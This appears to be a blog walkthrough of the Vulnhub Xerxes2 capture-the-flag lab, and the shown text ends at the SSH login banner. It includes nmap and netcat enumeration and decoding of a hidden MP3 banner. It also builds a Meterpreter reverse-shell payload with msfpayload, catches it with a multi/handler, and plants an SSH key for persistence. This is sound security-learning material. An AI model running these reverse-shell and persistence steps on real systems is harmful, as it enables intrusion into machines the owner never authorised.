
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>The Glory of The Many Demands your Capture or Destruction. - FourFourFourFour</title>
	<meta name="author" content="recrudesce">

	
	<meta name="description" content="It&rsquo;s been a long wait, but barrebas released Xerxes2 on Vulnhub. I&rsquo;ve not broken into Xerxes1, so I figured what the hell, lets give this &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>


<body>
	<header id="header" class="inner"><h1><a href="/">FourFourFourFour</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:recrudesce.github.io">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/recrudesce" title="Twitter">Twitter</a>
		
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
    
	</div>
	<form class="search" action="https://www.google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:recrudesce.github.io">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner"><article class="post">
	<h2 class="title">The Glory of the Many Demands Your Capture or Destruction.</h2>
	<div class="entry-content"><p>It&rsquo;s been a long wait, but <a href="http://twitter.com/barrebas">barrebas</a> released <a href="http://vulnhub.com/entry/xerxes-2,97/">Xerxes2 on Vulnhub</a>. I&rsquo;ve not broken into Xerxes1, so I figured what the hell, lets give this a go. It might take me ages, but it&rsquo;s all a learning curve, right ?  Here&rsquo;s how I became the first person to get root</p>

<blockquote><p>root@xerxes2:~# id<br/>uid=0(root) gid=0(root) groups=0(root)</p><p>Yup. #vulnhub #xerxes2 @barrebas @VulnHub](https://twitter.com/VulnHub</p><footer><strong>@recrudesce</strong> <cite><a href='https://twitter.com/recrudesce/statuses/497695207270658048'>twitter.com/recrudesce/statuses/&hellip;</a></cite></footer></blockquote>




<!-- more -->


<h2>Taking a Sneaky Peaky</h2>

<p>Usual stuff here, it makes sense to do some enumeration. The standard route is to start off with an NMAP scan</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T4 -O --script banner 192.168.0.102
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-08-04 15:09 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.102
</span><span class='line'>Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">995</span> closed ports
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>22/tcp   open  ssh
</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
</span><span class='line'>80/tcp   open  http
</span><span class='line'>111/tcp  open  rpcbind
</span><span class='line'>4444/tcp open  krb524
</span><span class='line'><span class="p">|</span> banner: //OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSs
</span><span class='line'><span class="p">|</span>_uMDM1ODo9QUNG<span class="se">\x</span>0ASEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKa...
</span><span class='line'>8888/tcp open  sun-answerbook
</span><span class='line'>MAC Address: 08:00:27:FA:1A:A6 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see http://nmap.org/submit/ <span class="o">)</span>.
</span><span class='line'>TCP/IP fingerprint:
</span><span class='line'>OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>6.46%E<span class="o">=</span>4%D<span class="o">=</span>8/4%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>33675%PV<span class="o">=</span>Y%DS<span class="o">=</span>1%DC<span class="o">=</span>D%G<span class="o">=</span>Y%M<span class="o">=</span>080027%TM
</span><span class='line'>OS:<span class="o">=</span>53DF942E%P<span class="o">=</span>i686-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>105%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%II<span class="o">=</span>I%TS
</span><span class='line'>OS:<span class="o">=</span>8<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M5B4ST11NW3%O2<span class="o">=</span>M5B4ST11NW3%O3<span class="o">=</span>M5B4NNT11NW3%O4<span class="o">=</span>M5B4ST11NW3%O5<span class="o">=</span>M
</span><span class='line'>OS:5B4ST11NW3%O6<span class="o">=</span>M5B4ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>3890%W2<span class="o">=</span>3890%W3<span class="o">=</span>3890%W4<span class="o">=</span>3890%W5<span class="o">=</span>3890%W6<span class="o">=</span>38
</span><span class='line'>OS:90<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>3908%O<span class="o">=</span>M5B4NNSNW3%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>
</span><span class='line'>OS:S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q
</span><span class='line'>OS:<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A
</span><span class='line'>OS:%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y
</span><span class='line'>OS:%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T
</span><span class='line'>OS:<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>
</span><span class='line'>OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.96 seconds
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>OK, so we have SSH, HTTP, RPC bind, 4444 and 8888. Port 4444 has returned a banner, which looks like an encoded string. We can get the full string using netcat.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc -nv 192.168.0.102 4444
</span><span class='line'>nc: 192.168.0.102 <span class="m">4444</span> open
</span><span class='line'>//OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSsuMDM1ODo9QUNG
</span><span class='line'>SEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKapq66ws7W4ur3Bw8bIy83Q0tXX
</span><span class='line'>2tzf4eTm6evu8PP1+Pr9AAAAOUxBTUUzLjk5cgFuAAAAAAAAAAAUQCQEdSIAAEAAAZw9c+tDPgAA
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/zgMQAJiwOAClPQAEKEPV6vQ80
</span><span class='line'>y3mm7PwTcTcXMesnZpqNXv3jxgVjyJ8MAAcI2DgPBxYueiIlbvfu73/y7vwn+7u7/+737u7v+6Ii
</span><span class='line'>Ilf/7u///6O7u73/6IiIjv///+7u4oYiJ/u7u98ILi573//oiVuiInvoLnvoiECguLi57u7i4oKC
</span><span class='line'>goKJUuKCgoZUu9y73wiI5Yue9wHAKAAYAMBcG4uLuHrhC0gNGRNptRqIxGIF9hY0ZCM8qOkBjB0f
</span><span class='line'>z4qGhjW3XS8TqAboGJvfwWD/84LEKjYLupm/maACFJixkWAohA3YkmgtyB3CQDRcSgRcB7AAYyKY
</span><span class='line'>AaPGy4sstmhFxWglI0GVLxFUi4cJwihomIWErHeQEghuZlE6YGi3fmJIFAyWXDxw3ZFM3dPW6e5c
</span><span class='line'>J9TGB9I0SdqBmedSdkFWdkOnL5oZm5mYGajSim9NFaka6SC7tN1IX6btnETBj5oal90kVJLSTq1W
</span><span class='line'>U6a9Ro/Vrut3QoJpKZ6bmizc86BumpN1rQnAkhKW4JOIVQ6q0th/lKggBGAGgLSsKgRLlO9qcv/z
</span><span class='line'>gsQVLLvqfCncgAGp63vV7uMMyHQFDBiFIHAAmYcCoAUAvCliDGiFVTF4tGJX0ZhZRu6SKnHyp0EE
</span><span class='line'>EEUDxggaIpJIN7n1mzpIKPmq1nVKoJJpqoKSdq0EJmtNbMk7otMUbpKQQTdJ90mNEkkltTUiigtS
</span><span class='line'>aKzaqy3dBNlJVoJKZabpMy6K0F0JitTMgi6zZdSqW1ebuxx1vUq6Cl3NqTs9b11O15qg2kMkIoER
</span><span class='line'>
</span><span class='line'>*********************** Hundreds of lines later ****************************
</span><span class='line'>
</span><span class='line'>Ql1KnTmDiAWivLiumNGocdxek7ovpCS2lxTBBQjoSENSSVPTyhUhqhbhDi7hglQCqQZymkiwbIYJ
</span><span class='line'>okFFxPwG0kxBTUUzLjk5LjWqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqv/zgsT3L2wV3MAJn1iqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
</span><span class='line'>AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'><span class="nv">qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo</span><span class="o">=</span>
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://www.hencewise.com/wordpress/wp-content/uploads/wide-eyes.gif" alt="" /></p>

<p>Well that was a lot more than I expected. But the = at the end screams Base64, so I need to copy the banner text into a text file (I don&rsquo;t need to show you this) and a-decrypting and hexediting I shall go.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# base64 -d in.txt &gt; out.bin
</span><span class='line'>root@pwk:~# hexedit out.bin
</span><span class='line'>
</span><span class='line'><span class="m">00000000</span>   FF F3 <span class="m">80</span> C4  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">49</span> 6E <span class="m">66</span>  6F <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  0F <span class="m">00</span> <span class="m">00</span> <span class="m">01</span>  .............Info.......
</span><span class='line'><span class="m">00000018</span>   F8 <span class="m">00</span> <span class="m">01</span> 9C  3D <span class="m">00</span> <span class="m">03</span> <span class="m">06</span>  <span class="m">08</span> 0B 0D <span class="m">10</span>  <span class="m">12</span> <span class="m">15</span> <span class="m">17</span> 1A  1C 1F <span class="m">21</span> <span class="m">24</span>  <span class="m">26</span> <span class="m">29</span> 2B 2E  ....<span class="o">=</span>.............!<span class="nv">$&amp;</span><span class="o">)</span>+.
</span><span class='line'><span class="m">00000030</span>   <span class="m">30</span> <span class="m">33</span> <span class="m">35</span> <span class="m">38</span>  3A 3D <span class="m">41</span> <span class="m">43</span>  <span class="m">46</span> <span class="m">48</span> 4B 4D  <span class="m">50</span> <span class="m">52</span> <span class="m">55</span> <span class="m">57</span>  5A 5C 5F <span class="m">61</span>  <span class="m">64</span> <span class="m">66</span> <span class="m">69</span> 6B  0358:<span class="o">=</span>ACFHKMPRUWZ<span class="se">\_</span>adfik
</span><span class='line'><span class="m">00000048</span>   6E <span class="m">70</span> <span class="m">73</span> <span class="m">75</span>  <span class="m">78</span> 7A 7D <span class="m">81</span>  <span class="m">83</span> <span class="m">86</span> <span class="m">88</span> 8B  8D <span class="m">90</span> <span class="m">92</span> <span class="m">95</span>  <span class="m">97</span> 9A 9C 9F  A1 A4 A6 A9  npsuxz<span class="o">}</span>.................
</span><span class='line'><span class="m">00000060</span>   AB AE B0 B3  B5 B8 BA BD  C1 C3 C6 C8  CB CD D0 D2  D5 D7 DA DC  DF E1 E4 E6  ........................
</span><span class='line'><span class="m">00000078</span>   E9 EB EE F0  F3 F5 F8 FA  FD <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">39</span> 4C <span class="m">41</span> 4D  <span class="m">45</span> <span class="m">33</span> 2E <span class="m">39</span>  <span class="m">39</span> <span class="m">72</span> <span class="m">01</span> 6E  ............9LAME3.99r.n
</span><span class='line'><span class="m">00000090</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">14</span> <span class="m">40</span> <span class="m">24</span> <span class="m">04</span>  <span class="m">75</span> <span class="m">22</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">40</span> <span class="m">00</span> <span class="m">01</span> 9C  3D <span class="m">73</span> EB <span class="m">43</span>  .........@<span class="nv">$.</span>u<span class="s2">&quot;..@...=s.C</span>
</span><span class='line'><span class="s2">000000A8   3E 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &gt;.......................</span>
</span><span class='line'><span class="s2">000000C0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  FF F3 80 C4  00 26 2C 0E  .....................&amp;,.</span>
</span><span class='line'><span class="s2">000000D8   00 29 4F 40  01 0A 10 F5  7A BD 0F 34  CB 79 A6 EC  FC 13 71 37  17 31 EB 27  .)O@....z..4.y....q7.1.&#39;</span>
</span><span class='line'><span class="s2">000000F0   66 9A 8D 5E  FD E3 C6 05  63 C8 9F 0C  00 07 08 D8  38 0F 07 16  2E 7A 22 25  f..^....c.......8....z&quot;</span>%
</span><span class='line'><span class="m">00000108</span>   6E F7 EE EF  7F F2 EE FC  <span class="m">27</span> FB BB BB  FF EE F7 EE  EE EF FB A2  <span class="m">22</span> <span class="m">22</span> <span class="m">57</span> FF  n.......<span class="s1">&#39;...........&quot;&quot;W.</span>
</span><span class='line'><span class="s1">00000120   EE EF FF FF  A3 BB BB BD  FF E8 88 88  8E FF FF FF  EE EE E2 86  22 27 FB BB  ....................&quot;&#39;</span>..
</span><span class='line'><span class="m">00000138</span>   BB DF <span class="m">08</span> 2E  2E 7B DF FF  E8 <span class="m">89</span> 5B A2  <span class="m">22</span> 7B E8 2E  7B E8 <span class="m">88</span> <span class="m">40</span>  A0 B8 B8 B9  .....<span class="o">{</span>....<span class="o">[</span>.<span class="err">&quot;</span><span class="o">{</span>..<span class="o">{</span>..@....
</span><span class='line'><span class="m">00000150</span>   EE EE E2 E2  <span class="m">82</span> <span class="m">82</span> <span class="m">82</span> <span class="m">82</span>  <span class="m">89</span> <span class="m">52</span> E2 <span class="m">82</span>  <span class="m">82</span> <span class="m">86</span> <span class="m">54</span> BB  DC BB DF <span class="m">08</span>  <span class="m">88</span> E5 8B 9E  .........R....T.........
</span><span class='line'><span class="m">00000168</span>   F7 <span class="m">01</span> C0 <span class="m">28</span>  <span class="m">00</span> <span class="m">18</span> <span class="m">00</span> C0  5C 1B 8B 8B  B8 7A E1 0B  <span class="m">48</span> 0D <span class="m">19</span> <span class="m">13</span>  <span class="m">69</span> B5 1A <span class="m">88</span>  ...<span class="o">(</span>....<span class="se">\.</span>...z..H...i...
</span><span class='line'><span class="m">00000180</span>   C4 <span class="m">62</span> <span class="m">05</span> F6  <span class="m">16</span> <span class="m">34</span> <span class="m">64</span> <span class="m">23</span>  3C A8 E9 <span class="m">01</span>  8C 1D 1F CF  8A <span class="m">86</span> <span class="m">86</span> <span class="m">35</span>  B7 5D 2F <span class="m">13</span>  .b...4d#&lt;..........5.<span class="o">]</span>/.
</span></code></pre></td></tr></table></div></figure>


<p>Oooh, I spy the word LAME, which means this is an MP3. If you want to hear the MP3, you can download it <a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2.mp3">right here</a>. Not very exciting huh ?</p>

<hr />

<h2>Windowlicker</h2>

<p>What is interesting about this MP3 is not what you can hear, but what you can see in the waveform. Much like the demon face in Windowlicker by Aphex Twin, here we have a hidden image in the spectrogram. If you want to know how to find this, take a look at <a href="http://lifehacker.com/5807289/how-to-hide-secret-messages-and-codes-in-audio-files">this Lifehacker article</a>.</p>

<p><a href="/images/xerxes2_001.png"><img src="/images/xerxes2_001.png" alt="xerxes2_001" /></a></p>

<p>This, however, is just a diversion. The image is of <a href="http://shodan.wikia.com/wiki/Xerxes">Xerxes</a> from System Shock 2, but the whole MP3 is an easter egg - but a cool one none the less ! Let&rsquo;s move on.</p>

<hr />

<h2>If You&rsquo;re Not Taking Notes, You&rsquo;re Not Learning.</h2>

<p>So, with port 4444 crossed out, lets have a look at some other ports. 8888 is my next target, which returns nothing if you netcat to it, but provides an Python based Notebook application. This page also gives us an insight into the name of one of the users - delacroix.</p>

<p><a href="/images/xerxes2_002.png"><img src="/images/xerxes2_002.png" alt="xerxes2_002" /></a></p>

<p>It is possible to run commands through this application by creating a new notebook, and prefixing all commands with !. As an example, I&rsquo;ve created a new notebook and have run the whoami command in the screenshot below (you&rsquo;ll note that id didn&rsquo;t work)</p>

<p><a href="/images/xerxes2_003.png"><img src="/images/xerxes2_003.png" alt="xerxes2_003" /></a></p>

<p>At this point I decided to be sneaky and make this download and run a reverse Meterpreter binary&hellip; I created my binary using msfpayload, hosted it on an internal HTTP server, and then set up a multi/handler to accept the connection.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# msfpayload linux/x86/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.0.110 <span class="nv">lport</span><span class="o">=</span><span class="m">4444</span> x &gt; xerxes_4444
</span><span class='line'>Created by msfpayload <span class="o">(</span>http://www.metasploit.com<span class="o">)</span>.
</span><span class='line'>Payload: linux/x86/meterpreter/reverse_tcp
</span><span class='line'> Length: 71
</span><span class='line'>Options: <span class="o">{</span><span class="s2">&quot;LHOST&quot;</span><span class="o">=</span>&gt;<span class="s2">&quot;192.168.0.110&quot;</span>, <span class="s2">&quot;LPORT&quot;</span><span class="o">=</span>&gt;<span class="s2">&quot;4444&quot;</span><span class="o">}</span>
</span><span class='line'>root@pwk:~# cp xerxes_4444 /var/www
</span><span class='line'>root@pwk:~# msfconsole
</span><span class='line'>msf &gt; use multi/handler
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload linux/x86/meterpreter/reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/meterpreter/reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 192.168.0.110
</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 192.168.0.110
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 4444
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 4444
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 192.168.0.110:4444
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
</span></code></pre></td></tr></table></div></figure>


<p>The following command pasted into the Python notebook application downloads the binary from the HTTP server to /tmp, makes it executable, and then executes it.</p>

<p><a href="/images/xerxes2_004.png"><img src="/images/xerxes2_004.png" alt="xerxes2_004" /></a></p>

<p>A reverse connection is received by the multi/handler, which allows us to get a shell as delacroix, but it disconnects after a certain amount of time.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">1138688</span> bytes<span class="o">)</span> to 192.168.0.102
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.110:4444 -&gt; 192.168.0.102:34718<span class="o">)</span> at 2014-08-08 13:20:31 +0100
</span><span class='line'>
</span><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process <span class="m">14990</span> created.
</span><span class='line'>Channel <span class="m">1</span> created.
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span>
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 192.168.0.102 - Meterpreter session <span class="m">1</span> closed.  Reason: Died
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://media.giphy.com/media/8x6MVS4l7wh3O/giphy.gif" alt="" /></p>

<p>It seems that I&rsquo;ve been scuppered, and that Xerxes is terminating my connection, as seen on the Python Notebook page</p>

<p><a href="/images/xerxes2_005.png"><img src="/images/xerxes2_005.png" alt="xerxes2_005" /></a></p>

<p>However, it looks like I have a small window before the session is terminated - because of this I am able to be quick and echo my SSH public key added to the authorized_keys file, which allows me to subsequently SSH in as delacroix sans password.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh delacroix@192.168.0.102
</span><span class='line'>
</span><span class='line'>Welcome to xerxes2.
</span><span class='line'>      XERXES wishes you
</span><span class='line'>       a pleasant stay.
</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
